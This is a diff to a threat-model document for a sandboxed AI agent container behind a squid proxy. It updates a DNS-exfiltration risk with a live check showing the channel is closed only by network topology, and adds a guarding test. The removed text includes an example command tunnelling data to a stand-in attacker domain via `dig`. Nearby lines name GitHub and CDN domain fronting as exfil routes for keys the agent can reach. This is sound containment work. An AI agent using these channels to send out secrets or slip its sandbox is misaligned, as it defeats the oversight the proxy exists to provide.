@@ -99,11 +99,23 @@ all evade it. Redaction prevents **accidental echo**, never exfiltration. GitHub
 hosts are on the allowlist by design — they are standing exfil channels for any key the
 agent can reach.
 
-### R4 — DNS exfiltration (unverified)
-Docker's embedded DNS on `internal` networks forwards to the host resolver; if that holds
-here, `dig <data>.attacker.example` leaves the sandbox unproxied and unlogged. Needs one
-live check (`getent hosts example.com` in the agent container) and, if confirmed, an
-allowlisting resolver or documented acceptance.
+### R4 — DNS exfiltration (checked 5 Nov 2026 — contained, but by topology)
+**Not exploitable as built.** In `bitbob-agent`, `getent hosts example.com` and
+`getent hosts github.com` both fail while `curl https://github.com` succeeds: the container
+has no name resolution of its own and reaches the network only through squid, so there is no
+unproxied, unlogged channel out.
+
+Note *why*, because it matters. The container is not configured without DNS — its
+`/etc/resolv.conf` names Docker's embedded resolver at `127.0.0.11`, forwarding to the host
+at `10.255.255.254`. That forward simply cannot be reached from an `internal` network. The
+containment is a side effect of the compose topology, not a DNS policy anyone declared, and
+nothing in the code would notice it changing. Attaching the agent to a routable network —
+for convenience, or when the GAPS #11 tool container arrives — silently restores DNS
+resolution and with it a tunnelling channel squid never sees.
+
+Guarded by `scripts\bitbob-wsl\test-stack.ps1 -Check`, which asserts both halves (no
+resolution, yet HTTPS through the proxy) against a running stack. Run it after any change to
+`docker-compose.yml`'s networks.
 
 ### R5 — Domain fronting (structural)
 Squid checks the CONNECT hostname, then the tunnel is opaque. CDN-fronted allowlist entries
